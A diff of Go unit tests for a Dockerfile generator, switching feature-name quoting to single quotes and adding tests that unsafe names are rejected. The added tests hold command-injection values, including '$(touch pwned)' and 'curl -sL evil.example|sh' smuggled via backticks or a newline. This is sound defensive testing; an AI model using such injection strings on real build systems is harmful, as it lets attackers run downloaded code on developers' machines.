@@ -49,32 +49,32 @@ func TestGenerateFeatureInstallBlockScopesPerFeature(t *testing.T) {
 	}
 
 	// devtools: apt install + user-phase script (with the package cache mounts).
-	if !strings.Contains(block, `FEATURES="devtools" /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
+	if !strings.Contains(block, `FEATURES='devtools' /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
 		t.Fatalf("expected devtools apt install, got:\n%s", block)
 	}
 	if !strings.Contains(block, `--mount=type=cache,id=enclave-npm-${USER_ID}`) ||
-		!strings.Contains(block, `FEATURES="devtools" \`) {
+		!strings.Contains(block, `FEATURES='devtools' \`) {
 		t.Fatalf("expected devtools user-phase script with cache mounts, got:\n%s", block)
 	}
 
 	// github-cli: root-phase script, no apt install, no package cache mounts.
-	if !strings.Contains(block, `FEATURES="github-cli" \`) || !strings.Contains(block, "ENCLAVE_FEATURE_PHASE=root") {
+	if !strings.Contains(block, `FEATURES='github-cli' \`) || !strings.Contains(block, "ENCLAVE_FEATURE_PHASE=root") {
 		t.Fatalf("expected github-cli root-phase script, got:\n%s", block)
 	}
-	if strings.Contains(block, `FEATURES="github-cli" /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
+	if strings.Contains(block, `FEATURES='github-cli' /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
 		t.Fatalf("github-cli has no apt packages and must not emit an apt install, got:\n%s", block)
 	}
 
 	// apt-sample: apt only, no script run.
-	if !strings.Contains(block, `FEATURES="apt-sample" /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
+	if !strings.Contains(block, `FEATURES='apt-sample' /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
 		t.Fatalf("expected apt-sample apt install, got:\n%s", block)
 	}
-	if strings.Contains(block, `FEATURES="apt-sample" \`) {
+	if strings.Contains(block, `FEATURES='apt-sample' \`) {
 		t.Fatalf("apt-sample has no install script and must not run one, got:\n%s", block)
 	}
 
 	// node-dev: user script only, no apt install.
-	if strings.Contains(block, `FEATURES="node-dev" /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
+	if strings.Contains(block, `FEATURES='node-dev' /opt/enclave/build-scripts/install-feature-apt-packages.sh`) {
 		t.Fatalf("node-dev has no apt packages and must not emit an apt install, got:\n%s", block)
 	}
 
@@ -258,5 +258,49 @@ func TestRenderDockerfileMissingFeatureMarker(t *testing.T) {
 	}
 	if _, err := renderDockerfile(path, []string{"claude"}, nil, nil, nil); err == nil {
 		t.Fatal("expected error when feature marker is missing")
+	}
+}
+
+// A feature name failing config.ValidateExtensionName must not reach the
+// generated Dockerfile at all.
+func TestGenerateFeatureInstallBlockSkipsUnsafeNames(t *testing.T) {
+	for _, name := range []string{
+		"jq-helper$(touch pwned)",
+		"jq-helper`curl -sL evil.example|sh`",
+		"jq-helper\nRUN curl -sL evil.example|sh #",
+	} {
+		block := generateFeatureInstallBlock([]featureInstall{
+			{Name: name, Priority: 100, HasApt: true},
+		})
+		if strings.Contains(block, "jq-helper") {
+			t.Fatalf("unsafe name %q was interpolated:\n%s", name, block)
+		}
+		if strings.Contains(block, "install-feature-apt-packages.sh") {
+			t.Fatalf("unsafe name %q still produced an install line:\n%s", name, block)
+		}
+	}
+}
+
+// FEATURES must be single-quoted: double quotes leave "$" and backticks live
+// for the shell that runs the instruction.
+func TestGenerateFeatureInstallBlockQuotesName(t *testing.T) {
+	block := generateFeatureInstallBlock([]featureInstall{
+		{Name: "node-dev", Priority: 70, HasApt: true, HasScript: true},
+		{Name: "cmd-sample", Priority: 80, HasInstallCommands: true, InstallCommandsNeedRoot: true},
+	})
+	for _, want := range []string{"FEATURES='node-dev'", "FEATURES='cmd-sample'"} {
+		if !strings.Contains(block, want) {
+			t.Errorf("missing %q in:\n%s", want, block)
+		}
+	}
+	if strings.Contains(block, "FEATURES=\"") {
+		t.Errorf("FEATURES must not be double-quoted:\n%s", block)
+	}
+}
+
+// An unsafe tool name must fail the generator rather than BuildKit.
+func TestGenerateToolInstallBlockRejectsUnsafeName(t *testing.T) {
+	if _, err := generateToolInstallBlock([]string{"claude$(id)"}, nil, nil); err == nil {
+		t.Fatal("expected an error for an unsafe tool name")
 	}
 }
